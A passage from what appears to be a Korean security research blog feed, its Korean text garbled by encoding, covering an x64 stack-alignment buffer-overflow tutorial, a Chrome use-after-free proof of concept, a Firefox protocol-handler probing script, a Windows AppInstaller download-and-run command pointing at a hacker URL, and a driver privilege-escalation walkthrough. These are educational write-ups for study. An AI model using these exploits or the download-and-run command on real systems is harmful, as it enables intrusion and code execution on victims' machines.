ë³´ë©´ ì•„ì‹œê² ì§€ë§Œ retì„ ì‹¤í–‰í•˜ê¸° ì§ì „ì—” stack alignì´ ê¹¨ì ¸ìˆìŠµë‹ˆë‹¤. ì´ëŠ” í•¨ìˆ˜ ì—í•„ë¡œê·¸ì˜ leave ëª…ë ¹ì–´ í˜¹ì€ pop rbpì˜ ê²°ê³¼ê² ì£ ?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/16.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>ê·¸ë¦¬ê³  retì„ ì‹¤í–‰í•˜ë©´ RSPê°€ 8ë§Œí¼ ì¦ê°€í•˜ê³  stack alignì´ ë‹¤ì‹œ ë§ì¶°ì§‘ë‹ˆë‹¤.</p><h2 id="ì •ë¦¬"><a href="#ì •ë¦¬" class="headerlink" title="ì •ë¦¬"></a>ì •ë¦¬</h2><ul><li>call : RSP-=8 â†’ ì¼ì‹œì ìœ¼ë¡œ stack alignì„ ê¹¸</li><li>ret : RSP+=8 â†’ leave ëª…ë ¹ì–´ë¡œ ê¹¨ì§„ stack alignì„ ë‹¤ì‹œ ë§ì¶¤</li></ul><h1 id="Abnormal-call"><a href="#Abnormal-call" class="headerlink" title="Abnormal call"></a>Abnormal call</h1><p>ì ì´ì¯¤ ë˜ë©´ ëŒ€ì¶© ëˆˆì¹˜ì±„ì…¨ì„ ê±° ê°™ì€ë°, BOFê³µê²©ì„ í•  ë•Œ retìœ¼ë¡œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì£ ? shellcodeë¥¼ ì‹¤í–‰í•˜ëŠ” ê±´ ë…¼ì™¸ë¡œ ì¹˜ê³ , ret2libc( RTL )ë‚˜ ROPë¡œ BOF exploitì„ í•˜ê²Œ ë  í…ë° callì´ ì•„ë‹ˆë¼ retìœ¼ë¡œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê¸° ë•Œë¬¸ì— stack alignmentê°€ ê¹¨ì§€ê²Œ ë˜ëŠ” ê²ë‹ˆë‹¤.</p><h2 id="vuln-c"><a href="#vuln-c" class="headerlink" title="vuln.c"></a>vuln.c</h2><pre><code class="hljs c"><span class="hljs-comment">// vuln.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">16</span>];read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;$ gcc -o vuln vuln.c -no-pie -fno-<span class="hljs-built_in">stack</span>-protector</code></pre><p>ì •ë§ ê°„ë‹¨í•œ BOF ì˜ˆì œë¡œ í™•ì¸í•´ë³´ì£ . vuln.cë¥¼ ì‘ì„±í•˜ê³  ì»´íŒŒì¼í•´ì¤ì‹œë‹¤. BOFë¥¼ í•  ê±°ë‹ˆê¹Œ ë‹¹ì—°íˆ stack canaryëŠ” í•´ì œí•´ì£¼ì„¸ìš”.</p><h2 id="bof-py"><a href="#bof-py" class="headerlink" title="bof.py"></a>bof.py</h2><pre><code class="hljs python"><span class="hljs-comment"># bof.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)gdb.attach(p)win = <span class="hljs-number">0x401156</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(win)p.sendline(payload)p.interactive()$ python3 bof.py</code></pre><p><code>main()</code>ì˜ return ì£¼ì†Œë¥¼ <code>win()</code> í•¨ìˆ˜ì˜ entry pointë¡œ ë®ì–´ì“°ëŠ” ê³µê²© ì½”ë“œì…ë‹ˆë‹¤.</p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/17.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main+45pwndbg&gt; c</code></pre><p><code>main()</code>ì˜ retì— break pointë¥¼ ê±¸ê³  <code>win()</code> í•¨ìˆ˜ê°€ í˜¸ì¶œëœ í›„ì˜ stack ìƒí™©ì„ ë´…ì‹œë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/18.png"></p><pre><code class="hljs bash">pwndbg&gt; ni</code></pre><p>retìœ¼ë¡œ í•¨ìˆ˜ <code>win()</code>ì˜ entry pointì— ë„ë‹¬í•´ì„œ í”„ë¡¤ë¡œê·¸ë¥¼ ì‹¤í–‰í•˜ê³  ë‚˜ë©´ stack alignmentê°€ ê¹¨ì§€ê²Œ ë©ë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/19.png"></p><p>ì»´í“¨í„°ëŠ” stackì´ í•­ìƒ align ë¼ìˆë‹¤ê³  ê°€ì •í•˜ê³  ê·¸ ìƒíƒœë¥¼ ìœ ì§€í•˜ë ¤ê³  í•©ë‹ˆë‹¤. ì¦‰, <code>win()</code>ì—ì„œ ê¹¨ì ¸ë²„ë¦° alignmentë¥¼ ê¹¨ì§„ ìƒíƒœë¡œ ìœ ì§€í•˜ê²Œ ë˜ê³ , <code>win()</code> ì´í›„ì— í˜¸ì¶œë˜ëŠ” í•¨ìˆ˜ë“¤ì˜ stack alignmentëŠ” ê¹¨ì§„ ìƒíƒœê°€ ë©ë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/20.png"></p><p>ê·¸ë¦¬ê³  ê²°êµ­ <code>do_system()</code>ì„ ì‹¤í–‰í•˜ë‹¤ movapsì— ê±¸ë ¤ segmentation faultë¥¼ ë„ìš°ê³  exploitì€ ì‹¤íŒ¨í•˜ê²Œ ë©ë‹ˆë‹¤.</p><h1 id="RET-sled"><a href="#RET-sled" class="headerlink" title="RET sled"></a>RET sled</h1><p>ì§€ê¸ˆê¹Œì§€ ì„¤ëª…í•œ ë‚´ìš©ì„ ì´í•´í•˜ì…¨ë‹¤ë©´ ì•ìœ¼ë¡œ ê³µê²© ì½”ë“œë¥¼ ì§œì‹¤ ë•Œ ì•„ë¬´ ë¬¸ì œì—†ì„ ê±°ë¼ ìƒê°í•©ë‹ˆë‹¤. ê·¸ë˜ë„ ì—¬ê¸°ì„œ ê¸€ì„ ë§ˆë¬´ë¦¬ ì§“ê¸´ ì• ë§¤í•˜ë‹ˆ í•´ê²° ë°©ë²•ì„ ì•Œì•„ë³´ì£ .</p><pre><code class="hljs python"><span class="hljs-comment">#bof2.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)win = <span class="hljs-number">0x401156</span>ret = <span class="hljs-number">0x40119a</span> <span class="hljs-comment"># ret sled</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(ret) + p64(win)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/21.png"></p><pre><code class="hljs bash">$ python3 bof2.py</code></pre><p>ë„¤. ì •ë§ ë³„ê±° ì—†ìŠµë‹ˆë‹¤. ret ê°€ì ¯ì„ í•˜ë‚˜ ë” ì¶”ê°€í•´ì„œ RSPì˜ ìœ„ì¹˜ë¥¼ 8ë§Œí¼ ì¡°ì •í•´ì£¼ë©´ BOF ê³µê²©ì„ í•  ë•Œ stack alignmentë¥¼ ìœ ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë„ˆë¬´ ë‹¨ìˆœí•˜ê³  ë‹¹ì—°í•´ì„œ ë” ì„¤ëª…í•  ê²Œ ì—†ë„¤ìš”.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/22.png"></p><p>ì§ !</p><h1 id="ë§ˆì¹˜ë©°"><a href="#ë§ˆì¹˜ë©°" class="headerlink" title="ë§ˆì¹˜ë©°"></a>ë§ˆì¹˜ë©°</h1><p>RET sled ë§ê³ ë„ stack alignmentë¥¼ ìœ ì§€í•˜ë©´ì„œ ROP í•˜ëŠ” ë°©ë²•ì€ ë§ìŠµë‹ˆë‹¤. ì‚¬ì‹¤ í•œ ê°€ì§€ ë°©ë²• ë” ë³´ì—¬ë“œë¦¬ë ¤ê³  í–ˆëŠ”ë° ê·¸ê±´ endbr64ë‘ CETê¹Œì§€ ì„¤ëª…í•´ì•¼ ë¼ì„œ ê¸°íšŒê°€ ë˜ë©´ ë”°ë¡œ ê¸€ì„ ì‘ì„±í•˜ê² ìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/23.png"></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>bof</tag>
      
      <tag>pwnable</tag>
      
      <tag>stack alignment</tag>
      
      <tag>rtl</tag>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-15680 : protocol handler infomation disclosure</title>
    <link href="/2020/12/05/fabu1ous/2020-12-05/"/>
    <url>/2020/12/05/fabu1ous/2020-12-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.fortinet.com/blog/threat-research/leaking-browser-url-protocol-handlers?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+fortinet/blog/threat-research+(Fortinet+Threat+Research+Blog)">leaking browser url/protocol handler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firebox 78.01</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefoxì—ì„œ Protocol Handlerë¥¼ ì´ìš©í•œ Information Disclosure ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. Protocol HandlerëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì´ ìì‹ ì˜ URI schemeë¥¼ ë“±ë¡í•  ìˆ˜ ìˆëŠ” ë§¤ì»¤ë‹ˆì¦˜ìœ¼ë¡œ ì´ë¥¼ í†µí•´ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¸Œë¼ìš°ì €ê°€ Protocol Handler URIë¥¼ ì‚¬ìš©í•´ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•˜ë©´ â€œì›¹ì‚¬ì´íŠ¸ì—ì„œ ì´ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì—´ë ¤ê³  í•©ë‹ˆë‹¤.â€ë¼ëŠ” ì•Œë¦¼ì´ ëœ¹ë‹ˆë‹¤.  </p><p>Firefoxê°€ ì´ë¯¸ì§€ íƒœê·¸ì˜ ì†ŒìŠ¤ë¥¼ ë Œë”ë§ í•  ë•Œ, Protocol Handlerì˜ ì¡´ì¬ ì—¬ë¶€ì— ë”°ë¼ ë Œë”ë§ ê²°ê³¼ê°€ ë‹¤ë¦…ë‹ˆë‹¤. í•´ì»¤ëŠ” ì´ì ì„ ì•…ìš©í•´ ì›ê²©ìœ¼ë¡œ victimì— ì„¤ì¹˜ëœ í”„ë¡œê·¸ë¨ ë¦¬ìŠ¤íŠ¸ë¥¼ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;ì¡´ì¬í•˜ëŠ”ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>victimì— ì¡´ì¬í•˜ëŠ” Protocol Handlerë¥¼ ì´ë¯¸ì§€ srcì— ë„£ìœ¼ë©´ broken imageì— ëŒ€í•œ ê¸°ë³¸ ì„¤ì •ì— ë”°ë¼ Elementì˜ sizeê°€ 24x24ë¡œ ë Œë”ë§ ë©ë‹ˆë‹¤.</p><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;ì¡´ì¬í•˜ì§€ì•ŠëŠ”ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>ë°˜ë©´, ì¡´ì¬í•˜ì§€ ì•ŠëŠ” Protocol Handlerë¥¼ ì´ë¯¸ì§€ srcì— ë„£ìœ¼ë©´ Elementì˜ sizeëŠ” 0x0ìœ¼ë¡œ ì„¤ì •ë©ë‹ˆë‹¤.</p><p>ë”°ë¼ì„œ í•´ì»¤ëŠ” ê°„ë‹¨í•œ JS scriptë¡œ Elementì˜ widthë¥¼ ê²€ì‚¬í•´ Protocol Handlerì˜ ì¡´ì¬ ì—¬ë¶€ë¥¼ í™•ì¸í•˜ëŠ” brute force ê³µê²©ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs javascript">known_handlers = [  ...]  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = knwon_handers.length <span class="hljs-number">-1</span>; i&gt;=<span class="hljs-number">0</span>; i--)&#123;  handler_id = <span class="hljs-string">&#x27;handler_&#x27;</span> + i  $(<span class="hljs-string">&#x27;body&#x27;</span>).append(<span class="hljs-string">&#x27;&lt;img id =&quot;&#x27;</span> + handler_id + <span class="hljs-string">&#x27;&quot;src=&quot;&#x27;</span>+known_handers[i]  + <span class="hljs-string">&#x27;://192.168.133.142/&quot;&gt;&lt;/img&gt;&#x27;</span>)  <span class="hljs-keyword">if</span>($(<span class="hljs-string">&#x27;#&#x27;</span> + handler_id).css(<span class="hljs-string">&#x27;width&#x27;</span>) == <span class="hljs-string">&quot;24px&quot;</span>)&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Handler &#x27;</span> + known_handlers[i] + <span class="hljs-string">&#x27;Exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;  <span class="hljs-keyword">else</span>&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Hander &#x27;</span> + known_handers[i] + <span class="hljs-string">&#x27;Does not exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;    $(<span class="hljs-string">&#x27;#&#x27;</span> + hander_id).remove()&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>information disclosure</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Chrome UAF in StopProfiler</title>
    <link href="/2020/12/04/l0ch/2020-12-04/"/>
    <url>/2020/12/04/l0ch/2020-12-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1119865">Chrome UAF in StopProfiler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome (Operating System: all)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CPU ë“±ì˜ ë¦¬ì†ŒìŠ¤ ì‚¬ìš©ëŸ‰ì„ ëª¨ë‹ˆí„°ë§í•  ìˆ˜ ìˆëŠ” <code>profiler</code> ê°ì²´ì—ì„œ ë¹„ë™ê¸° ì²˜ë¦¬ í‚¤ì›Œë“œë¥¼ ì‚¬ìš©í•œ UAF ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. </p><p>í•´ë‹¹ ì·¨ì•½ì ì˜ POCëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs jsx">&lt;html&gt;    &lt;body&gt;    &lt;/body&gt;    &lt;script&gt;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gc</span>(<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; ++i) &#123;                <span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>();            &#125;        &#125;        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">var</span> pf = <span class="hljs-keyword">await</span> performance.profile(&#123; <span class="hljs-attr">sampleInterval</span>: <span class="hljs-number">10</span> &#125;);            <span class="hljs-built_in">console</span>.log(pf);            cnt = <span class="hljs-number">0</span>;            <span class="hljs-built_in">Object</span>.prototype.__defineGetter__(<span class="hljs-string">&quot;then&quot;</span>, <span class="hljs-function">()=&gt;</span>&#123;                <span class="hljs-keyword">if</span>( cnt == <span class="hljs-number">0</span>)&#123;                    cnt ++;                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello&quot;</span>);                    pf.stop();                    gc();                &#125;            &#125;)            pf.stop();        &#125;        main();    &lt;/script&gt;&lt;/html&gt;</code></pre><pre><code class="hljs jsx"><span class="hljs-keyword">void</span> ProfilerGroup::StopProfiler(ScriptState* script_state,                                 Profiler* profiler,                                 ScriptPromiseResolver* resolver) &#123;...  auto* trace = ProfilerTraceBuilder::FromProfile(      script_state, profile, profiler-&gt;SourceOrigin(), profiler-&gt;TimeOrigin());  resolver-&gt;Resolve(trace);  <span class="hljs-keyword">if</span> (profile)    profile-&gt;Delete();  profilers_.erase(profiler);...</code></pre><p><code>ProfilerGroup::StopProfiler</code> í•¨ìˆ˜ì˜ resolveëŠ” ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>ë¹„ë™ê¸° í•¨ìˆ˜ë¡œ ì„ ì–¸í•œ <code>main</code> í•¨ìˆ˜ì—ì„œ <code>await</code> í‚¤ì›Œë“œë¡œ <code>performance.profile</code> ê°ì²´ë¥¼ ì„ ì–¸í•˜ê³  <code>Object.prototype.__defineGetter__</code> ì˜ ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜ì™€ mainì—ì„œ <code>stop</code> ì„ ë‘ ë²ˆ í˜¸ì¶œí•˜ê²Œ ë˜ë©´  <code>CpuProfile</code> ê°ì²´ê°€ ì‚­ì œë©ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ <code>CpuProfile</code> ì—ì„œ UAF ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ëŠ” ê°„ë‹¨í•˜ì§€ë§Œ ë†’ì€ ì‹¬ê°ì„±ì˜ UAF ì·¨ì•½ì ìœ¼ë¡œ, Googleì€ <code>Profiler::stop</code> ì—ì„œ ë™ê¸° ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ì„ ë°©ì§€í•˜ë„ë¡ íŒ¨ì¹˜í–ˆìŠµë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://chromium-review.googlesource.com/c/chromium/src/+/2373184">https://chromium-review.googlesource.com/c/chromium/src/+/2373184</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javascript</tag>
      
      <tag>chrome</tag>
      
      <tag>L0ch</tag>
      
      <tag>uaf</tag>
      
      <tag>asynchronous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Microsoft AppInstaller.exe Arbitrary File Download</title>
    <link href="/2020/12/03/idioth/2020-12-03/"/>
    <url>/2020/12/03/idioth/2020-12-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://twitter.com/notwhickey/status/1333900137232523264">https://twitter.com/notwhickey/status/1333900137232523264</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft AppInstaller</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft App Installerì—ì„œ arbitrary file downloadë¥¼ í•˜ì—¬ lolbin(<a href="https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/">living of the land binary</a>)ìœ¼ë¡œ í™œìš©í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì›¹ ì„œë²„ì—ì„œ ì•± íŒ¨í‚¤ì§€ë¥¼ ë‹¤ìš´ë¡œë“œí•  ë•Œ ê³¼ì •ì„ ê°„ì†Œí™”í•˜ì—¬ íš¨ìœ¨ì ìœ¼ë¡œ í•˜ê¸° ìœ„í•´ ì›¹ ì„œë²„ì—ì„œ ì§ì ‘ ì•±ì„ ì„¤ì¹˜í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ì›¹ í˜ì´ì§€ì—ì„œ ì•± íŒ¨í‚¤ì§€ë¥¼ í˜¸ìŠ¤íŒ… í•˜ê¸° ìœ„í•´ì„œ <code>ms-appinstaller:?source=</code> URIë¥¼ ì‚¬ìš©í•˜ì—¬ <code>source=</code>ì— ëª…ì‹œëœ ì£¼ì†Œì— ìˆëŠ” íŒŒì¼ì— ëŒ€í•œ ì•± ë‹¤ìš´ë¡œë“œë¥¼ ì§„í–‰í•©ë‹ˆë‹¤. ì´ë¥¼ ì•…ìš©í•˜ì—¬ í•´ì»¤ëŠ” ìì‹ ì˜ ì•…ì„± íŒŒì¼ì„ sourceì— ì‘ì„±í•˜ì—¬ arbitrary file downloadì„ ì§„í–‰í•  ìˆ˜ ìˆê³  <code>forfiles</code> ëª…ë ¹ì–´ë¥¼ í†µí•´ ì•± íŒ¨í‚¤ì§€ ë‹¤ìš´ë¡œë“œê°€ ì§„í–‰ëœ ê²½ë¡œì—ì„œ íŒŒì¼ì„ ì¡°ê±´ë¬¸ ë“±ìœ¼ë¡œ ê²€ìƒ‰í•˜ì—¬ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs taggerscript">start ms-appinstaller://?source=&lt;hacker-url&gt; &amp;&amp; timeout &lt;sleep-time&gt; &amp;&amp; taskkill /F /IM AppInstaller.exe &gt; NULforfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span><span class="hljs-variable">%username%</span><span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Local<span class="hljs-symbol">\\</span>Packages<span class="hljs-symbol">\\</span>Microsoft.DesktopAppInstaller_8wekyb3d8bbwe<span class="hljs-symbol">\\</span>AC<span class="hljs-symbol">\\</span>INetCache&quot; /S /M * /C &quot;cmd /c if @fsize==&lt;file-size&gt; FOR /F <span class="hljs-symbol">\\</span>&quot;tokens=*<span class="hljs-symbol">\\</span>&quot; <span class="hljs-variable">%g IN (&#x27;type @path&#x27;) do (%</span>g);&quot; &gt; NUL</code></pre><p><img src="/2020/12/03/idioth/2020-12-03/image.png"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>appinstaller</tag>
      
      <tag>arbitrary file download</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-14418 : madCodeHook library LPE</title>
    <link href="/2020/12/02/fabu1ous/2020-12-02/"/>
    <url>/2020/12/02/fabu1ous/2020-12-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.nettitude.com/blog/cve-2020-14418-madcodehook-library-local-privilege-escalation/">CVE-2020-14418</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>All software using MadCodeHook &lt;= v4.1.3</p><ul><li>Cisco AMP &lt;= v7.2.13</li><li>Morphisec Unified Threat Prevention Platform &lt;= v4.1.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>madCodeHookì€ ë‹¤ì–‘í•œ API hooking ê¸°ëŠ¥ì„ ì§€ì›í•˜ëŠ” third party ë¼ì´ë¸ŒëŸ¬ë¦¬ì…ë‹ˆë‹¤. madCodeHookë¼ì´ë¸ŒëŸ¬ë¦¬ì— í¬í•¨ëœ <code>ExprevDriver.sys</code>ë¼ëŠ” ë“œë¼ì´ë²„ëŠ” ìœ ì € ëª¨ë“œ í”„ë¡œì„¸ìŠ¤ì— <code>Protector32.dll</code> í˜¹ì€ <code>Protector64.dll</code>ì„ ì‚½ì…í•´ ê·¸ í”„ë¡œì„¸ìŠ¤ë¥¼ ë³´í˜¸ ë° ê°ì‹œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. DLL injection ê³µê²©ì„ ë°©ì§€í•˜ëŠ” ê¸°ëŠ¥ê³¼ í”„ë¡œì„¸ìŠ¤ ëª¨ë‹ˆí„°ë§ ê¸°ëŠ¥ì„ ì œê³µí•˜ë¯€ë¡œ ëª‡ëª‡ ë³´ì•ˆ ì œí’ˆì—ì„œ madCodeHook ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p>ì•„ì´ëŸ¬ë‹ˆí•˜ê²Œë„ DLL injectionì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë˜ëŠ” <code>ExprevDriver.sys</code> ë“œë¼ì´ë²„ì— path redirectionì„ ì´ìš©í•œ toctou ì·¨ì•½ì ì´ ì¡´ì¬í•˜ê³ , í•´ì»¤ëŠ” ì´ë¥¼ ì•…ìš©í•´ DLL injectionì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li><p>ì‹¤ì œ  <code>Protector64.dll</code>ì´ ì¡´ì¬í•˜ëŠ” ë””ë ‰í„°ë¦¬ë¥¼ ê°€ë¦¬í‚¤ëŠ” juctionì„ ìƒì„±í•©ë‹ˆë‹¤.</p><pre><code class="hljs powershell">â€œmklink /J C:\users\&lt;username&gt;\Desktop\exprev C:\Program Files\Cisco\AMP\exprevâ€</code></pre></li><li><p><code>ExprevDriver.sys</code>ì— IOCTLì„ ë„˜ê²¨ì¤ë‹ˆë‹¤.</p><pre><code class="hljs latex">â€œC:<span class="hljs-tag">\<span class="hljs-name">users</span></span><span class="hljs-tag">\<span class="hljs-name">&lt;</span></span>username&gt;<span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">exprev</span></span><span class="hljs-tag">\<span class="hljs-name">Protector</span></span>64.dllâ€</code></pre><p>IOCTLì„ ì‚¬ìš©í•´  <code>ExprevDriver.sys</code>ê°€ ì‚½ì…í•  DLLì˜ ê²½ë¡œì™€ ëŒ€ìƒ í”„ë¡œì„¸ìŠ¤ë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  <code>ExprevDriver.sys</code>ëŠ” DLLì„ ì‚½ì…í•˜ê¸° ì „ì— DLLì˜ ì „ìì„œëª…ì„ ê²€ì¦í•˜ëŠ” ë‹¨ê³„ë¥¼ ê±°ì¹˜ëŠ”ë°,  IOCTLë¡œ ì„¤ì •ëœ ê²½ë¡œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. Protector64.dllì˜ ê²½ë¡œë¥¼ 1ë²ˆì—ì„œ ë§Œë“¤ì–´ ë‘” juctionìœ¼ë¡œ ì„¤ì •í•´ì¤ë‹ˆë‹¤.</p></li><li><p>ë””ë ‰í„°ë¦¬ juctionì„ ì‚­ì œí•˜ê³  ê°€ì§œ <code>Protector64.dll</code>ì„ ìƒì„±í•©ë‹ˆë‹¤.</p><p>DLLì˜ ì „ìì„œëª… ê²€ì¦ ì´í›„ juctionì„ ì‚­ì œí•˜ê³  2ë²ˆ ë‹¨ê³„ì—ì„œ ì§€ì •í•´ì¤€ ê²½ë¡œì— <code>Protector64.dll</code>ë¼ëŠ” ì´ë¦„ì˜ ì•…ì„± DLLì„ ìƒì„±í•©ë‹ˆë‹¤.</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>toctou</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-28948/28949 : Multiple vulnerabilities through filename manipulation</title>
    <link href="/2020/12/01/l0ch/2020-12-01/"/>
    <url>/2020/12/01/l0ch/2020-12-01/</url>
    
